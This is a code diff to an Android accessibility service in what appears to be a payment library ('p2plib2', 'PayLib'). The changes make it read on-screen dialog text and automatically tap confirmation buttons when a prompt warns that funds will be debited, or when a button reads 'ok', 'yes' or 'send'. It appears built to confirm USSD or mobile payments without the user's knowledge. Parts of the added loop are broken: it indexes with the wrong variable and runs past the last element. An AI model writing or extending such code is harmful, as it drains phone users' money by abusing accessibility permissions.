@@ -1,4 +1,4 @@
-package  com.p2plib2.ussd;
+package com.p2plib2.ussd;
 
 
 import android.accessibilityservice.AccessibilityService;
@@ -8,6 +8,7 @@ import android.content.Context;
 import android.os.Bundle;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
+
 import com.p2plib2.Logger;
 import com.p2plib2.PayLib;
 
@@ -86,8 +87,11 @@ public class AccessService extends AccessibilityService {
                 str += event.getText().get(1);
             }
             PayLib.feedback.callResult("Code P2P-004: " + str);
-            if (str.contains("могут быть списаны средства")) {
+            if (str.contains("списаны средства") && str.contains("p2pPay")) {
                 clickOnButton(event, 0);
+            } else {
+                Logger.lg("str " + str);
+
             }
         }
     }
@@ -203,12 +207,19 @@ public class AccessService extends AccessibilityService {
                         }
                     }
                     if (nodeButton.getClassName().toString().toLowerCase().contains("scrollview")) {
-                        Logger.lg("nodeButton " + nodeButton.getText());
+                        Logger.lg("nodeButton " + nodeButton.getText() + " count " +  nodeButton.getChildCount());
                         if (nodeButton.getChildCount() == 1) {
                             nodeButton.getChild(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
                         } else {
-                            nodeButton.getChild(1).performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                            for (int k = 0; k <= nodeButton.getChildCount(); k++) {
+                                Logger.lg("button " + nodeButton.getChild(i).getText().toString());
+                                if (nodeButton.getChild(i).getText().toString().toLowerCase().contains("ok")
+                                        || nodeButton.getText().toString().toLowerCase().contains("да")
+                                        || nodeButton.getText().toString().toLowerCase().contains("отправ"))
+                                    nodeButton.getChild(i).performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                            }
                         }
+                        flagok = false;
                     }
                 }
             }
